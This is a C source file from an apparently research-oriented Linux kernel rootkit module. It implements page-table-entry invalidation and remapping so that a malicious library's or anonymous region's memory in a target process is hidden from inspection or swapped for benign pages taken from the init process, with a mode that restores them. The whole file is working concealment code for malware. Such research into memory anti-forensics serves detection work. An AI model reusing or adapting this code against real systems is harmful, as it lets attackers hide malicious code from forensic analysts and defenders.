/* pte_modify.c -- invalidating or remapping PTEs
 *
 * Copyright (C) 2019 Patrick Reichenberger
 * Additional Authors:
 * Frank Block, ERNW Research GmbH <fblock@ernw.de>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
 */
#include <linux/slab.h>
#include <linux/pagemap.h>

#include "rootkit_module.h"
#include "pte_helper.h"
#include "pte_modify.h"
#include "helper.h"
#include "debug.h"


int vma_rights_p[] = {(VM_READ | VM_EXEC), VM_READ, (VM_READ | VM_WRITE)};

/* Initialization of an empty linked list to store the values of the invalidated/remapped PTEs */
LIST_HEAD(va_pte_ll);

struct va_pte_entry_ll *create_va_pte_entry(pte_uint64 va_val, pte_uint64 pte_val) {
    struct va_pte_entry_ll *ptr = kmalloc(sizeof(struct va_pte_entry_ll), GFP_NOWAIT);
    ptr->va_val = va_val;
    ptr->pte_val = pte_val;
    return ptr;
}

/** insert_ll_va_pte - insert va_pte_entry_ll in linked list
 *  @va: virtual address
 *  @pte: pointer to the PTE
 *
 *  Inserts a va_pte_entry_ll into the linked list. If an element with the same key is existent, only the values are
 *  adapted.
 */
int insert_ll_va_pte(VIRT_ADDR va, PTE *pte) {
    /* Checks if the virtual address is already in the linked list */
    int found_and_changed = 0;
    struct va_pte_entry_ll *vape_ptr = NULL;
    list_for_each_entry(vape_ptr, &va_pte_ll, va_pte_list) {
        if(vape_ptr->va_val == va.value) {
            vape_ptr->va_val = va.value;
            found_and_changed = 1;
        }
    }

    /* If it is not in the linked list, then allocate memory and add into the linked list */
    if(!found_and_changed) {
        struct va_pte_entry_ll *insert = create_va_pte_entry(va.value, pte->value);
        list_add(&insert->va_pte_list, &va_pte_ll);
    }
    return 0;
}

/* Lookup a va_pte_entry_ll in the linked list */
struct va_pte_entry_ll *lookup_ll_va_pte(VIRT_ADDR va) {
    struct va_pte_entry_ll *vape_ptr = NULL;
    list_for_each_entry(vape_ptr, &va_pte_ll, va_pte_list) {
        if(vape_ptr->va_val == va.value) {
            return vape_ptr;
        }
    }
    return NULL;
}


/* -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 * -=-=-=-=-=-=-=- Invalidate PTEs -=-=-=-=-=-=-=-=-
 * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 */

/** invalidate_restore_pte - invalidates the PTE or restores the value of a PTE
 *  @pid: PID
 *  @va: virtual address
 *  @mode: hide or reveal
 *
 *  Check if the PTE for this virtual address exists.
 *  If yes, create a backup entry and invalidate the PTE
 *  The page to which the PTE maps is deleted from the page cache.
 *
 */
int invalidate_restore_pte(int pid, VIRT_ADDR va, int mode) {

    PTE *pte;
    PTE_STATUS stat;
    if (mode == HIDE) {
        log_print(LOG_DEBUG, "Invalidate PTE.");
        /* Get the PTE for the given virtual address */
        stat = pte_from_virt_for_pid(va.pointer, &pte, pid);
        if(stat) {
            log_print(LOG_ERR, "Error, address %#016llx has no valid mapping", va.value);
            return -1;
        }

        /* Store the PTE value in the backup list */
        if(!insert_ll_va_pte(va, pte)) {

            own_delete_from_page_cache(pte);
            struct page *page = get_pte_page(pte);

            /* Sets the whole PTE to a NULL entry, i.e. invalidating the entry */
            pte->value = 0;

            /* Set the reserved flag so that the page frame is not reclaimed or swapped */
            SetPageReserved(page);

            /* Check if it is changed correctly, not needed for operation, more for debugging and info */
            stat = pte_from_virt_for_pid(va.pointer, &pte, pid);
            if(stat == 4) {
                log_print(LOG_INFO , "Successfully invalidated PTE: VA %#016lx\n", va.value);
                return 0;
            } else {
                log_print(LOG_ERR, "Invalidation check failed.");
                return -1;
            }
        } else {
            log_print(LOG_ERR, "Failed to invalidate PTE. Error in linked list insert.");
            return -1;
        }

    } else if (mode == REVEAL){
        log_print(LOG_DEBUG, "Restore PTE.");
        /* This returns status 4, but this is intended since it sets the pointer to the PTE */
        pte_from_virt_for_pid(va.pointer, &pte, pid);

        struct va_pte_entry_ll *obj = lookup_ll_va_pte(va);
        if(obj) {
            /* Restore the original value */
            pte->value = obj->pte_val;

            /* Clear the reserved flag */
            struct page *page = get_pte_page(pte);
            ClearPageReserved(page);

            log_print(LOG_INFO, "Successfully restored PTE: VA %#016lx PTE %#016lx\n", va.value, pte->value);
            return 0;
        } else {
            log_print(LOG_ERR, "Failed to restore PTE. Not found in linked list.");
            return -1;
        }
    } else {
        log_print(LOG_ERR, "Invalid mode.");
        return -1;
    }
}


/** pte_invalidate_handler - handles the technique of invalidating PTEs
*  @mal_lib_path: path of malicious library VMAs
*  @pid: PID
*  @mode: hide or reveal
*
*  Determines the VMAs and pages therein that need to be deleted or restored.
*
*/
void pte_invalidate_handler(char *mal_lib_path, int pid, int mode) {
    struct vm_area_struct *mal_vma;
    VIRT_ADDR va;

    for (int i = 0; i < sizeof(vma_rights_p) / sizeof(int); i++) {
        /* Find the specific VMA of the malicious library. */

        mal_vma = find_vma_path_rights(0, mal_lib_path, vma_rights_p[i], pid);
        if (mal_vma) {
            for(va.value = mal_vma->vm_start; va.value < mal_vma->vm_end; va.value = va.value+4096) {
                 invalidate_restore_pte(pid, va, mode);
#ifdef MANUAL_MODE
                 modify_rss_stat_count(mal_vma->vm_mm, mal_vma->vm_flags, 0, mode);
#endif
            }
        }
    }
}


/** pte_invalidate_anon_handler - handles the technique of invalidating PTEs
*  @mal_lib_path: path of malicious library VMAs
*  @pid: PID
*  @mode: hide or reveal
*
*  Determines the VMAs and pages therein that need to be deleted or restored.
*
*/
void pte_invalidate_anon_handler(unsigned long long vm_start, int pid, int mode) {
    struct vm_area_struct *mal_vma;
    VIRT_ADDR va;

    mal_vma = find_vma_with_start_address(vm_start, pid);
    if (mal_vma) {
        for(va.value = mal_vma->vm_start; va.value < mal_vma->vm_end; va.value = va.value+0x1000) {
                invalidate_restore_pte(pid, va, mode);
#ifdef MANUAL_MODE
                modify_rss_stat_count(mal_vma->vm_mm, mal_vma->vm_flags, 0, mode);
#endif
        }
    }
}



/* -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 * -=-=-=-=-=-=-=-=-= Remap PTEs -=-=-=-=-=-=-=-=-=-
 * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 */

/** remap_pte - remaps the pages of malicious VMA to pages frames with benign content
 *  @mal_vma: VMA containing the addresses to remap
 *  @benign_vma: VMA of init process to which to remap
 *  @pid: PID
 *
 *  Create backup entry with the original start and end address and change the start and end address
 *  of the vm_area_struct of the malicious VMA to the start and end address of a benign VMA.
 *  The pages inside the VMA are deleted from the page cache.
 *
 *  In manual mode, the Resident Set Size (RSS) of the process is adjusted, as this causes problems
 *  when closing the process and VMAs are deleted.
 */
void remap_pte(struct vm_area_struct *mal_vma, struct vm_area_struct *benign_vma, int pid, MemoryMode mem_mode) {
    VIRT_ADDR mal_va;
    VIRT_ADDR benign_va;
    PTE *mal_pte;
    PTE *benign_pte;

    mal_va.value = mal_vma->vm_start;
    benign_va.value = benign_vma->vm_start;

    /* Check if all pages can be remapped, i.e. whether target VMA is same size or bigger */
    if((mal_vma->vm_end - mal_vma->vm_start) > (benign_vma->vm_end - benign_vma->vm_start)) {
        log_print(LOG_WARN, "Malicious VMA bigger than benign VMA. Not all pages remapped..");
    }

    /* Traverse the malicious and benign VMA in page sized steps */
    while(mal_va.value < mal_vma->vm_end && benign_va.value < benign_vma->vm_end) {
        log_print(LOG_DEBUG, "Remap MalVA %#016llx from range %#016llx-%#016llx to\nBenVA %#016llx from range %#016llx-%#016llx",
                  mal_va.value, mal_vma->vm_start, mal_vma->vm_end, benign_va.value, benign_vma->vm_start, benign_vma->vm_end);
        /* Determine pointer to PTE for malicious page */
        PTE_STATUS stat_mal = pte_from_virt_for_pid(mal_va.pointer, &mal_pte, pid);
        if(stat_mal) {
            log_print(LOG_ERR, "Error, address %#016llx has no valid mapping.", mal_va.value);
        }
        /* Determine pointer to PTE for benign page */
        PTE_STATUS stat_benign = pte_from_virt_for_pid(benign_va.pointer, &benign_pte, 1);
        if(stat_mal) {
            log_print(LOG_ERR, "Error, address %#016llx has no valid mapping.", benign_va.value);
        }
        
        if(!stat_mal && !stat_benign) {
            struct page *malpage = get_pte_page(mal_pte);
            struct page *benpage = get_pte_page(benign_pte);
            
            /* Store the PTE value in the backup list */
            if(!insert_ll_va_pte(mal_va, mal_pte)) {
#ifdef MANUAL_MODE
                if (mem_mode == SHARED_LIB)
                    modify_rss_stat_countpteremap(mal_vma->vm_mm, mal_vma->vm_flags, HIDE);
                else
                    modify_rss_stat_countpteremap_anon(mal_vma->vm_mm, HIDE, mem_mode);
#endif
                /* Delete the page from page cache */
                own_delete_from_page_cache(mal_pte);

                /* Change the PFN of the malicious PTE to the PFN of the benign PTE */
                PHYS_ADDR target = (PHYS_ADDR) benign_pte->page_frame << 12;
                log_print(LOG_INFO, "Remapping malicious virtual address %#016llx with PFN %#016llx to %#016llx with PFN %#016llx.", mal_va.pointer, mal_pte->page_frame, benign_va.pointer, benign_pte->page_frame);
                remap_page(mal_va, target, pid);

                /* Set the reserved flag so that the page frame is not reclaimed or swapped */
                SetPageReserved(malpage);

                /* Increases page->_refcount: A usage reference counter for the page.
                 * Used to keep track of the number of processes that are sharing the corresponding page frame.
                 * Page frame should be freed only when it becomes -1.
                 */
                page_ref_inc(benpage);
            } else {
                log_print(LOG_ERR, "Failed to remap PTE. Error in linked list insert.");
            }
        }
        mal_va.value += 4096;
        benign_va.value += 4096;
    }
}

/** reset_pte - resets the PTE to its original value
 *  @mal_vma: VMA containing the addresses to reset
 *  @pid: PID
 *
 *  Check if backup entry for given virtual address is existent and if so, restore the original value of its PTE.
 *
 *  In manual mode, the Resident Set Size (RSS) of the process is adjusted, as it had to be
 *  changed when remapping the PTEs.
 */
void reset_pte(struct vm_area_struct *mal_vma, int pid, MemoryMode mem_mode) {
    VIRT_ADDR mal_va;
    PTE *mal_pte;

    mal_va.value = mal_vma->vm_start;
    /* Traverse malicious VMA in page sized steps */
    while(mal_va.value < mal_vma->vm_end) {
        /* Determine pointer to PTE for malicious page whose value is to be restored */
        PTE_STATUS stat = pte_from_virt_for_pid(mal_va.pointer, &mal_pte, pid);
        if(stat) {
            log_print(LOG_ERR, "Error, address %#016llx has no valid mapping.", mal_va.value);
        }

        /* Determines the BENIGN page struct here, as the PTEs are remapped */
        struct page *benpage = get_pte_page(mal_pte);

        struct va_pte_entry_ll *obj = lookup_ll_va_pte(mal_va);

        if(obj) {
            log_print(LOG_INFO, "Reset malicious VA %#016lx to PTE %#016lx", mal_va.value, obj->pte_val);
            /* Reset the PTE to its original value */
            mal_pte->value = obj->pte_val;

            /* Determine the pointer to PTE of malicious page */
            PTE_STATUS stat = pte_from_virt_for_pid(mal_va.pointer, &mal_pte, pid);
            if(!stat) {
                /* Determine malicious page struct */
                struct page *malpage = get_pte_page(mal_pte);
#ifdef MANUAL_MODE
                if (mem_mode == SHARED_LIB)
                    modify_rss_stat_countpteremap(mal_vma->vm_mm, mal_vma->vm_flags, REVEAL);
                else
                    modify_rss_stat_countpteremap_anon(mal_vma->vm_mm, REVEAL, mem_mode);
#endif
                /* Set the reserved flag so that the page frame is not reclaimed or swapped */
                ClearPageReserved(malpage);

                /* Decrease page->_refcount: A usage reference counter for the page.
                 * Used to keep track of the number of processes that are sharing the corresponding page frame.
                 * Page frame should be freed only when _count becomes -1.
                 */
                page_ref_dec(benpage);
            } else {
                log_print(LOG_ERR, "Failed to reset PTE value. Address %#016llx has no valid mapping.", mal_va.value);
            }
        } else {
            log_print(LOG_ERR, "Failed to reset PTE value. Not found in linked list.");
        }
        mal_va.value += 4096;
    }
}


/** pte_remap_handler - handles the technique of remapping the PTEs
*  @mal_lib_path: path of malicious library VMAs
*  @pid: PID
*  @mode: hide or reveal
*
*  Determines the VMAs and pages therein that need to be remapped or reset.
*
*/
void pte_remap_handler(char *mal_lib_path, int pid, int mode) {
    struct vm_area_struct *mal_vma;
    struct vm_area_struct *ben_vma = 0;
    struct vm_area_struct *mal_start_vma = NULL;

    if(!mode) {
        /* Remap the pages of the VMAs with the specified path. */
        for(int i = 0; i < sizeof(vma_rights_p)/sizeof(int); ++i) {
            /* Find the specific VMA of the malicious library. */
            mal_vma = find_vma_path_rights(0, mal_lib_path, vma_rights_p[i], pid);
            ben_vma = get_fitting_benign_vma(mal_vma, vma_rights_p[i]);

            mal_start_vma = mal_vma;
            do {
                /* Remap the pages */
                if(mal_vma && ben_vma) {
                    log_print(LOG_INFO, "Starting PTE remapping for malicious vma at: 0x%016lx.", mal_vma->vm_start);
                    remap_pte(mal_vma, ben_vma, pid, SHARED_LIB);

                }
                mal_vma = find_vma_path_rights(mal_vma, mal_lib_path, vma_rights_p[i], pid);
                ben_vma = get_fitting_benign_vma(mal_vma, vma_rights_p[i]);
                if (mal_vma && !ben_vma){
                    log_print(LOG_ERR, "No benign vma found for malicious vma at: 0x%016lx", mal_vma->vm_start);
                }
            } while (mal_vma != mal_start_vma && mal_vma != 0 && ben_vma != 0);

        }
    } else {

        /* Reset the pages of the VMAs */
        for(int i = 0; i < sizeof(vma_rights_p)/sizeof(int); ++i) {
            /* Find the specific VMAs of the malicious library. */
            mal_vma = find_vma_path_rights(0, mal_lib_path, vma_rights_p[i], pid);
            mal_start_vma = mal_vma;

            do {
                if(mal_vma) {
                    reset_pte(mal_vma, pid, SHARED_LIB);
                }
                mal_vma = find_vma_path_rights(mal_vma, mal_lib_path, vma_rights_p[i], pid);
            } while (mal_vma != mal_start_vma && mal_vma != 0);

        }
    }
}

void pte_remap_handler_anon(unsigned long long vm_start, int pid, int mode, MemoryMode mem_mode) {

    struct vm_area_struct *mal_vma = 0;
    struct vm_area_struct *ben_vma = 0;

    mal_vma = find_vma_with_start_address(vm_start, pid);

    if (!mal_vma){
        log_print(LOG_ERR, "the malicious vma could not be found.");
        return;
    }

    if(!mode) {
        ben_vma = find_vma_with_size(mal_vma->vm_end - mal_vma->vm_start);
        if (!ben_vma){
            log_print(LOG_ERR, "No benign vma found for malicious vma at: 0x%016lx", mal_vma->vm_start);
            return;
        }

        log_print(LOG_INFO, "Starting PTE remapping for malicious vma at: 0x%016lx with size 0x%lx.", mal_vma->vm_start, (mal_vma->vm_end - mal_vma->vm_start));
        remap_pte(mal_vma, ben_vma, pid, mem_mode);

    } else {
        reset_pte(mal_vma, pid, mem_mode);
    }

}


struct vm_area_struct *find_vma_with_size(unsigned long long size){
    /* Find the first VMA in the init process address space that fits in size */
    struct vm_area_struct *vma = find_vma_mmap(1);
    while(vma) {
        /* Benign VMA needs to fit in size */
        if((vma->vm_end - vma->vm_start) >= size) {
            log_print(LOG_INFO, "Found VMA with vm_start %lx", vma->vm_start);
            return vma;
        }
        vma = vma->vm_next;
    }
    log_print(LOG_ERR, "No benign vma with a fitting size found.");
    return NULL;
}

struct vm_area_struct *get_fitting_benign_vma(struct vm_area_struct *mal_vma, int rights){
    /* Find the first VMA in the init process address space that fits in size */
    struct vm_area_struct *vma = find_vma_mmap(1);
    while(vma) {
        /* Benign VMA needs to fit in size, must be a file mapping and has the same access rights */
        if(vma->vm_file && vma->vm_file->f_path.dentry && (vma->vm_flags & 0x7) == rights
            && mal_vma && (vma->vm_end - vma->vm_start) >= (mal_vma->vm_end - mal_vma->vm_start)) {
            log_print(LOG_INFO, "Found VMA is %s -- start %lx", vma->vm_file->f_path.dentry->d_name.name, vma->vm_start);
            return vma;
        }
        vma = vma->vm_next;
    }
    /* Fallback if no fitting VMA is found. */
    return find_vma_path_rights(0, "systemd", rights, 1);
}
